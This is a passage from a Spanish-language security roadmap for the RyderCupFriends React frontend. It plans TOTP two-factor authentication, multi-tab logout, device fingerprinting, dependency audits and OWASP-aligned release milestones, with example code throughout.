| **react-dom** | Seguridad, performance | Mensual |
| **react-router-dom** | Seguridad, navegación | Mensual |
| **@sentry/react** | Error tracking, seguridad | Mensual |
| **vite** | Build tool, seguridad | Mensual |
| **tailwindcss** | Styling, no crítico | Trimestral |

**Proceso Mensual Recomendado:**
1. Ejecutar `npm audit` y `npm outdated`
2. Revisar release notes de dependencias críticas
3. Actualizar en ambiente local
4. Testing exhaustivo
5. Deploy a staging
6. Testing en staging
7. Deploy a producción

**Crear Script de Auditoría:**
```json
// package.json
{
  "scripts": {
    "audit": "npm audit && npm outdated",
    "audit:fix": "npm audit fix && npm test",
    "update:safe": "npm update && npm test",
    "update:all": "npm update && npm install react@latest react-dom@latest && npm test"
  }
}
```

**Impacto:**
- ✅ Prevención de vulnerabilidades conocidas
- ✅ Mejoras de performance y estabilidad
- ✅ Compatibilidad con últimas features

---

### 🟢 Prioridad MEDIA (v1.9.0)

#### 8. Implementar Autenticación de Dos Factores (2FA/MFA)
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 8-12 horas
**Impacto:** Protección crítica contra credential stuffing y phishing
**OWASP:** A07:2021 - Identification and Authentication Failures
**Prioridad:** ALTA (mover a v1.8.0 si es posible)

**Problema Actual:**
- Solo autenticación por password (single factor)
- Vulnerable a credential stuffing, phishing, password leaks

**Solución:**

**Opción 1: TOTP (Time-based One-Time Password) - Recomendado**
- Compatible con Google Authenticator, Authy, Microsoft Authenticator
- No requiere SMS (más seguro y sin costos)
- Estándar de industria

**Opción 2: Email OTP**
- Enviar código de 6 dígitos por email
- Más fácil de implementar
- Menos seguro que TOTP

**Opción 3: SMS OTP**
- Requiere servicio de SMS (Twilio, AWS SNS)
- Costos adicionales
- Vulnerable a SIM swapping

**Implementación TOTP (Recomendado):**

**Paso 1: Instalar librerías**
```bash
npm install qrcode.react otpauth
```

**Paso 2: Backend genera secret y QR code**
```python
# Backend endpoint (ejemplo)
import pyotp
import qrcode
from io import BytesIO
import base64

@router.post("/api/v1/auth/2fa/enable")
async def enable_2fa(current_user: User):
    # Generar secret único para el usuario
    secret = pyotp.random_base32()

    # Crear URI para QR code
    totp_uri = pyotp.totp.TOTP(secret).provisioning_uri(
        name=current_user.email,
        issuer_name="RyderCupFriends"
    )

    # Guardar secret en BD (encriptado)
    user.two_factor_secret = encrypt(secret)
    user.two_factor_enabled = False  # Pendiente de confirmación
    db.commit()

    return {
        "secret": secret,  # Para backup manual
        "qr_code_uri": totp_uri  # Para generar QR en frontend
    }

@router.post("/api/v1/auth/2fa/verify")
async def verify_2fa_setup(code: str, current_user: User):
    secret = decrypt(current_user.two_factor_secret)
    totp = pyotp.TOTP(secret)

    if totp.verify(code, valid_window=1):
        current_user.two_factor_enabled = True
        db.commit()
        return {"message": "2FA enabled successfully"}
    else:
        raise HTTPException(400, "Invalid code")

@router.post("/api/v1/auth/login-2fa")
async def login_with_2fa(email: str, password: str, totp_code: str):
    # Verificar password primero
    user = authenticate_user(email, password)

    if user.two_factor_enabled:
        secret = decrypt(user.two_factor_secret)
        totp = pyotp.TOTP(secret)

        if not totp.verify(totp_code, valid_window=1):
            raise HTTPException(401, "Invalid 2FA code")

    # Generar token de sesión
    return {"access_token": create_access_token(user)}
```

**Paso 3: Frontend - Página de configuración 2FA**
```javascript
// src/pages/Setup2FA.jsx (CREAR)
import React, { useState, useEffect } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import toast from 'react-hot-toast';

const Setup2FA = () => {
  const [step, setStep] = useState(1); // 1: Generar QR, 2: Verificar código
  const [qrCodeUri, setQrCodeUri] = useState('');
  const [secret, setSecret] = useState('');
  const [verificationCode, setVerificationCode] = useState('');

  const handleEnable2FA = async () => {
    const response = await fetch(`${API_URL}/api/v1/auth/2fa/enable`, {
      method: 'POST',
      credentials: 'include',
    });
    const data = await response.json();

    setQrCodeUri(data.qr_code_uri);
    setSecret(data.secret);
    setStep(2);
  };

  const handleVerifyCode = async () => {
    try {
      const response = await fetch(`${API_URL}/api/v1/auth/2fa/verify`, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: verificationCode }),
      });

      if (response.ok) {
        toast.success('2FA enabled successfully!');
        navigate('/profile');
      } else {
        toast.error('Invalid code. Try again.');
      }
    } catch (error) {
      toast.error('Failed to verify code');
    }
  };

  return (
    <div className="max-w-lg mx-auto p-6">
      {step === 1 && (
        <div>
          <h1 className="text-2xl font-bold mb-4">Enable Two-Factor Authentication</h1>
          <p className="mb-4">
            Add an extra layer of security to your account by enabling 2FA.
          </p>
          <button
            onClick={handleEnable2FA}
            className="px-4 py-2 bg-primary text-white rounded-lg"
          >
            Enable 2FA
          </button>
        </div>
      )}

      {step === 2 && (
        <div>
          <h1 className="text-2xl font-bold mb-4">Scan QR Code</h1>
          <p className="mb-4">
            Scan this QR code with Google Authenticator or Authy:
          </p>

          <div className="flex justify-center mb-4">
            <QRCodeSVG value={qrCodeUri} size={256} />
          </div>

          <div className="bg-gray-100 p-4 rounded-lg mb-4">
            <p className="text-sm font-mono break-all">
              Manual entry: {secret}
            </p>
          </div>

          <label className="block mb-2">
            Enter verification code from your app:
          </label>
          <input
            type="text"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
            placeholder="123456"
            maxLength={6}
            className="border rounded-lg px-4 py-2 w-full mb-4"
          />

          <button
            onClick={handleVerifyCode}
            disabled={verificationCode.length !== 6}
            className="px-4 py-2 bg-primary text-white rounded-lg disabled:opacity-50"
          >
            Verify and Enable
          </button>
        </div>
      )}
    </div>
  );
};

export default Setup2FA;
```

**Paso 4: Frontend - Integrar en Login**
```javascript
// src/pages/Login.jsx (MODIFICAR)
const Login = () => {
  const [requires2FA, setRequires2FA] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // Intentar login normal primero
      const response = await fetch(`${API_URL}/api/v1/auth/login`, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: formData.email,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (data.requires_2fa) {
        // Usuario tiene 2FA habilitado
        setRequires2FA(true);
        toast('Please enter your 2FA code', { icon: '🔐' });
        return;
      }

      // Login exitoso sin 2FA
      navigate('/dashboard');
    } catch (error) {
      toast.error('Login failed');
    }
  };

  const handleSubmit2FA = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch(`${API_URL}/api/v1/auth/login-2fa`, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: formData.email,
          password: formData.password,
          totp_code: twoFactorCode,
        }),
      });

      if (response.ok) {
        toast.success('Login successful!');
        navigate('/dashboard');
      } else {
        toast.error('Invalid 2FA code');
      }
    } catch (error) {
      toast.error('Login failed');
    }
  };

  return (
    <div>
      {!requires2FA ? (
        <form onSubmit={handleSubmit}>
          {/* Formulario normal de login */}
        </form>
      ) : (
        <form onSubmit={handleSubmit2FA}>
          <h2 className="text-xl font-bold mb-4">Enter 2FA Code</h2>
          <input
            type="text"
            value={twoFactorCode}
            onChange={(e) => setTwoFactorCode(e.target.value)}
            placeholder="123456"
            maxLength={6}
            className="border rounded-lg px-4 py-2 w-full mb-4"
          />
          <button type="submit" className="w-full px-4 py-2 bg-primary text-white rounded-lg">
            Verify
          </button>
        </form>
      )}
    </div>
  );
};
```

**Archivos a Crear:**
- `src/pages/Setup2FA.jsx` - Página de configuración de 2FA
- `src/pages/Verify2FA.jsx` - Página de verificación en login

**Archivos a Modificar:**
- `src/pages/Login.jsx` - Agregar soporte para 2FA
- `src/pages/Profile.jsx` - Agregar botón "Enable 2FA"
- `src/App.jsx` - Agregar rutas de 2FA

**Archivos Backend a Crear/Modificar:**
- Backend debe implementar endpoints de 2FA
- Almacenar `two_factor_secret` encriptado en BD
- Agregar campo `two_factor_enabled` a modelo User

**Testing:**
1. Habilitar 2FA en perfil
2. Escanear QR con Google Authenticator
3. Logout
4. Login → Debe pedir código 2FA
5. Ingresar código de 6 dígitos
6. Debe permitir acceso

**Impacto:**
- ✅ Protección crítica contra credential stuffing (99% efectivo)
- ✅ Protección contra phishing
- ✅ Cumple estándares bancarios y financieros
- ✅ OWASP Top 10 A07 mitigado significativamente
- ⚠️ Requiere coordinación con backend (1-2 semanas)

**Costo:** Gratis (TOTP no requiere servicios externos)

**Nota:** Priorizar para v1.8.0 o v1.9.0 dependiendo de recursos

---

#### 9. Implementar Broadcast Channel para Logout Multi-Tab
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 2 horas
**Impacto:** Mejorar seguridad en navegación multi-tab
**OWASP:** A07:2021 - Identification and Authentication Failures

**Problema Actual:**
- Usuario hace logout en una pestaña
- Otras pestañas siguen con sesión activa
- Riesgo de seguridad si alguien accede al navegador

**Solución:**

```javascript
// src/utils/broadcastAuth.js (CREAR)
const AUTH_CHANNEL = 'auth_channel';
const channel = new BroadcastChannel(AUTH_CHANNEL);

export const broadcastLogout = () => {
  channel.postMessage({ type: 'LOGOUT' });
};

export const listenForAuthChanges = (onLogout) => {
  channel.onmessage = (event) => {
    if (event.data.type === 'LOGOUT') {
      onLogout();
    }
  };
};

export const closeBroadcastChannel = () => {
  channel.close();
};
```

**Usar en App.jsx:**
```javascript
// src/App.jsx
import { listenForAuthChanges, closeBroadcastChannel } from './utils/broadcastAuth';

function App() {
  useEffect(() => {
    listenForAuthChanges(() => {
      // Otra pestaña hizo logout
      clearUserData();
      navigate('/login');
      toast('Logged out from another tab');
    });

    return () => closeBroadcastChannel();
  }, []);

  return <Router>{/* ... */}</Router>;
}
```

**Modificar logout:**
```javascript
// src/components/layout/HeaderAuth.jsx
import { broadcastLogout } from '../../utils/broadcastAuth';

const handleLogout = () => {
  clearUserData();
  broadcastLogout();  // ← Notificar a otras pestañas
  navigate('/login');
};
```

**Archivos a Crear:**
- `src/utils/broadcastAuth.js`

**Archivos a Modificar:**
- `src/App.jsx` - Escuchar eventos
- `src/components/layout/HeaderAuth.jsx` - Broadcast en logout

**Impacto:**
- ✅ Logout sincronizado en todas las pestañas
- ✅ Mejor seguridad en dispositivos compartidos
- ✅ Mejor UX (consistencia entre tabs)

---

#### 10. Implementar Device Fingerprinting y Notificación de Login
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 6-8 horas
**Impacto:** Detectar accesos sospechosos
**OWASP:** A07:2021 - Identification and Authentication Failures

**Problema Actual:**
- No hay registro de desde dónde se accede
- Usuario no es notificado de logins desde dispositivos nuevos

**Solución:**

**Paso 1: Instalar librería de fingerprinting**
```bash
npm install @fingerprintjs/fingerprintjs
```

**Paso 2: Generar fingerprint en login**
```javascript
// src/utils/deviceFingerprint.js (CREAR)
import FingerprintJS from '@fingerprintjs/fingerprintjs';

export const getDeviceFingerprint = async () => {
  const fp = await FingerprintJS.load();
  const result = await fp.get();

  return {
    visitorId: result.visitorId,
    components: {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
    }
  };
};
```

**Paso 3: Enviar fingerprint en login**
```javascript
// src/pages/Login.jsx
import { getDeviceFingerprint } from '../utils/deviceFingerprint';

const handleSubmit = async (e) => {
  e.preventDefault();

  const fingerprint = await getDeviceFingerprint();

  const response = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: formData.email,
      password: formData.password,
      device_fingerprint: fingerprint.visitorId,
      device_info: fingerprint.components,
    }),
  });

  const data = await response.json();

  if (data.new_device_detected) {
    toast('New device detected. Check your email for confirmation.', {
      duration: 5000,
      icon: '🔐',
    });
  }

  navigate('/dashboard');
};
```

**Paso 4: Backend registra dispositivos**
```python
# Backend (ejemplo)
@router.post("/api/v1/auth/login")
async def login(credentials: LoginRequest, db: Session):
    user = authenticate_user(credentials.email, credentials.password)

    # Verificar si es dispositivo conocido
    device = db.query(Device).filter(
        Device.user_id == user.id,
        Device.fingerprint == credentials.device_fingerprint
    ).first()

    if not device:
        # Dispositivo nuevo - guardar y enviar email
        new_device = Device(
            user_id=user.id,
            fingerprint=credentials.device_fingerprint,
            device_info=credentials.device_info,
            first_seen=datetime.utcnow(),
            last_seen=datetime.utcnow()
        )
        db.add(new_device)
        db.commit()

        # Enviar email de notificación
        send_new_device_email(user.email, credentials.device_info)

        return {
            "access_token": create_token(user),
            "new_device_detected": True
        }
    else:
        # Actualizar last_seen
        device.last_seen = datetime.utcnow()
        db.commit()

        return {
            "access_token": create_token(user),
            "new_device_detected": False
        }
```

**Archivos a Crear:**
- `src/utils/deviceFingerprint.js`
- `src/pages/ManageDevices.jsx` - Página para ver/eliminar dispositivos

**Archivos a Modificar:**
- `src/pages/Login.jsx` - Enviar fingerprint
- `src/pages/Profile.jsx` - Link a "Manage Devices"

**Archivos Backend a Crear:**
- Modelo `Device` con fingerprint, device_info, etc.
- Endpoint para listar dispositivos del usuario
- Endpoint para revocar dispositivos

**Impacto:**
- ✅ Detección de accesos desde dispositivos nuevos
- ✅ Notificación al usuario de actividad sospechosa
- ✅ Usuario puede revisar y revocar dispositivos
- ✅ Cumple con mejores prácticas de seguridad

---

#### 11. Implementar Error Boundaries Adicionales
**Estado:** ⚠️ **BÁSICO** (solo Sentry Error Boundary)
**Estimación:** 2-3 horas
**Impacto:** Mejor UX en caso de errores
**OWASP:** A09:2021 - Security Logging and Monitoring Failures

**Crear Error Boundaries por Módulo:**
```javascript
// src/components/errors/FeatureErrorBoundary.jsx
import React from 'react';
import { useNavigate } from 'react-router-dom';

class FeatureErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error('Feature Error:', error, errorInfo);
    // Sentry ya captura errores globalmente
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen flex items-center justify-center">
          <div className="text-center">
            <h1 className="text-2xl font-bold text-red-600 mb-4">
              Oops! Something went wrong
            </h1>
            <p className="text-gray-600 mb-4">
              {this.props.featureName} encountered an error.
            </p>
            <button
              onClick={() => window.location.reload()}
              className="px-4 py-2 bg-primary text-white rounded-lg"
            >
              Reload Page
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

export default FeatureErrorBoundary;
```

**Impacto:**
- ✅ Mejor UX cuando hay errores
- ✅ Prevención de crash total de la app

---

## 🛠️ Desarrollo - Tareas Pendientes

### Módulo de Enrollments

#### Integrar Use Cases en UI
**Estado:** ⏳ Pendiente
**Prioridad:** 🟡 Media
**Estimación:** 2-3 horas

**Archivos a Modificar:**
- `src/pages/CompetitionDetail.jsx` - Usar use cases en lugar de servicios
- `src/pages/BrowseCompetitions.jsx` - Usar `requestEnrollmentUseCase`

---

### Módulo de Perfil

#### Sistema de Foto de Perfil
**Estado:** 🔒 Bloqueado por backend
**Requiere:**
- Campo `avatar_url` en modelo User (backend)
- Endpoint `PUT /api/v1/users/avatar` (multipart/form-data)
- Almacenamiento (S3, Cloudinary, o local)

---

## 🧪 Testing

### Estado Actual
- ✅ **419 tests pasando** (100% success rate)
- ✅ Domain Layer: 100% cobertura
- ✅ Application Layer: 90% cobertura
- ⏳ Enrollment Use Cases: 0% (no prioritario)

### Próximos Tests
- Tests de validación de inputs (inputValidation.test.js)
- Tests E2E con Playwright (no iniciado)
- Tests de integración de Enrollments UI
- Tests de seguridad (CSP, XSS attempts)

---

## 📦 Optimización

### Completado
- ✅ Code splitting (manual chunks)
- ✅ Lazy loading de rutas
- ✅ Bundle reducido 95% (978 KB → 47 KB)
- ✅ Suspense con loading fallback

### Futuras Optimizaciones
- Preload de rutas críticas
- Service Worker para offline (PWA)
- Image optimization (AVIF/WebP)

---

## 🚀 Roadmap de Versiones

### v1.8.0 (Próxima - Security Release) - Estimado: 3-4 semanas

**Objetivo:** Securizar el frontend contra ataques comunes (OWASP Top 10 2021)

**Semana 1: httpOnly Cookies (Backend) + Quick Wins**
- ⏳ Esperar a que backend implemente httpOnly cookies
- ⏳ Revisar cambios en API
- ⏳ Preparar cambios en repositories
- ✅ **Quick Win 1:** Aumentar contraseña mínima a 12 caracteres - 30 min
- ✅ **Quick Win 2:** Agregar headers de seguridad adicionales - 30 min

**Semana 2: httpOnly Cookies (Frontend)**
- 🔐 Eliminar `src/utils/secureAuth.js` - 1h
- 🔐 Agregar `credentials: 'include'` en todos los repositories - 2h
- 🔐 Actualizar Login/Register/Dashboard (logout) - 2h
- 🧪 Testing exhaustivo httpOnly cookies - 2h

**Semana 3: Input Sanitization + CSP + Inactivity**
- 🔐 Mejorar validaciones existentes (validation.js) - 2h
- 🔐 Agregar validaciones en formularios pendientes - 2h
- 🔐 Mejorar CSP (eliminar unsafe-inline) - 2-3h
- 🔐 Implementar logout por inactividad - 2h
- 🔐 Implementar broadcast channel para logout multi-tab - 2h

**Semana 4: Auditorías y Testing**
- 🔐 Auditoría de secretos - 1h
- 🔐 Actualización de dependencias (npm audit) - 2h
- 🧪 Testing de seguridad integral - 3h
- 🧪 Testing E2E de flujos de autenticación - 2h
- 📝 Documentación de cambios de seguridad - 1h

**Tareas de v1.8.0:**
1. ✅ Aumentar contraseña mínima a 12 caracteres
2. ✅ Agregar headers de seguridad adicionales (COOP, COEP, CORP)
3. 🔐 Migrar tokens a httpOnly cookies
4. 🔐 Mejorar CSP (eliminar unsafe-inline)
5. 🔐 Implementar logout por inactividad (30 min)
6. 🔐 Implementar broadcast channel para logout multi-tab
7. 🔐 Auditoría y actualización de dependencias
8. 🔐 Prevención de XSS (mejorar validaciones)
9. 🧪 Testing de seguridad

**Total estimado:** 25-30 horas de desarrollo

**OWASP Categories Addressed:**
- ✅ A01: Broken Access Control (httpOnly cookies, inactividad)
- ✅ A02: Cryptographic Failures (httpOnly cookies)
- ✅ A03: Injection (validaciones, CSP)
- ✅ A05: Security Misconfiguration (headers, CSP, dependencias)
- ✅ A06: Vulnerable Components (npm audit, updates)
- ✅ A07: Authentication Failures (password 12 chars, inactividad)

---

### v1.9.0 (Security + Features) - 1-2 meses después

**Objetivo:** Completar protecciones OWASP y funcionalidad core

**Security (Prioridad Alta):**
- 🔐 **reCAPTCHA v3** en Login/Register - 3-4h
- 🔐 **2FA/MFA (TOTP)** - 8-12h (CRÍTICO)
- 🔐 Device Fingerprinting y notificación de logins - 6-8h
- 🔐 Gestión de dispositivos confiables - 4h

**Features:**
- 👤 Sistema de avatares - 4-6h
- 📝 Gestión de errores centralizada (Error Boundaries) - 2-3h
- 🎨 UI de enrollments refactorizada - 6-8h
- 🧪 Tests E2E con Playwright - 8-10h

**Total estimado:** 40-55 horas de desarrollo

**OWASP Categories Addressed:**
- ✅ A04: Insecure Design (reCAPTCHA, 2FA)
- ✅ A07: Authentication Failures (2FA, device fingerprinting)
- ✅ A09: Logging & Monitoring (Error Boundaries mejorados)

---

### v2.0.0 (Mayor - Futuro) - 4-6 meses

**Objetivo:** Plataforma completa y escalable

**Security:**
- 🔐 Refresh tokens con rotación automática
- 🔐 Políticas de contraseñas avanzadas (historial, expiración)
- 🔐 Audit logging completo (todas las acciones de usuario)
- 🔐 Rate limiting avanzado (por IP, por usuario, por acción)

**Features:**
- 📱 Progressive Web App (PWA)
- 🌍 Internacionalización (i18n) - Español/Inglés
- 🎮 Sistema completo de equipos y torneos
- 📊 Analytics y métricas de uso
- 🔔 Sistema de notificaciones en tiempo real
- 💬 Chat entre jugadores

**Infrastructure:**
- 🚀 CI/CD completo con security scanning
- 🧪 Cobertura de tests > 95%
- 📈 Monitoreo avanzado con alertas
- 🔄 Backup y disaster recovery

**Total estimado:** 200+ horas de desarrollo

---

## 📝 Notas de Implementación

### Orden Recomendado de Implementación (v1.8.0)

**Día 1-5: Esperar Backend (httpOnly cookies)**
- Backend implementa httpOnly cookies
- Backend implementa rate limiting
- Backend implementa security headers

**Día 6-7: httpOnly Cookies Frontend**
1. Eliminar `src/utils/secureAuth.js`
2. Agregar `credentials: 'include'` en repositories
3. Actualizar Login/Register/Logout
4. Testing local
5. Deploy a staging

**Día 8-10: Input Sanitization**
1. Crear `src/utils/inputValidation.js`
2. Agregar validaciones en CreateCompetition
3. Agregar validaciones en Register
4. Agregar validaciones en EditProfile
5. Tests unitarios de validación

**Día 11-12: CSP + Auditorías**
1. Mejorar CSP (eliminar unsafe-inline)
2. Auditoría de secretos
3. Actualización de dependencias
4. npm audit fix
5. Testing exhaustivo

**Día 13-15: Testing y Deploy**
1. Testing conjunto frontend + backend
2. Verificar que httpOnly cookies funcionan
3. Verificar validaciones de inputs
4. Verificar CSP no rompe nada
5. Deploy a producción
6. Monitoreo con Sentry

---

### Coordinación Frontend-Backend

**Para cambios de seguridad (httpOnly cookies):**
1. ⚠️ **Backend implementa PRIMERO** (semana 1-2)
2. Frontend adapta DESPUÉS (semana 2-3)
3. Testing exhaustivo en staging
4. Deploy coordinado
5. Monitoreo post-deploy (Sentry)

---

## 🔗 Referencias

- [React Security Best Practices](https://react.dev/learn/security)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CSP Guide](https://web.dev/csp/)
- [npm audit Documentation](https://docs.npmjs.com/cli/v9/commands/npm-audit)
- Backend ROADMAP: `../RyderCupAm/ROADMAP.md`
- Frontend ADR-004: httpOnly Cookies Migration
- Frontend ADR-005: Sentry Error Tracking

---

**Última revisión:** 27 Nov 2025
**Próxima revisión:** Después de v1.8.0 (Security Release)
**Responsable:** Equipo de desarrollo frontend
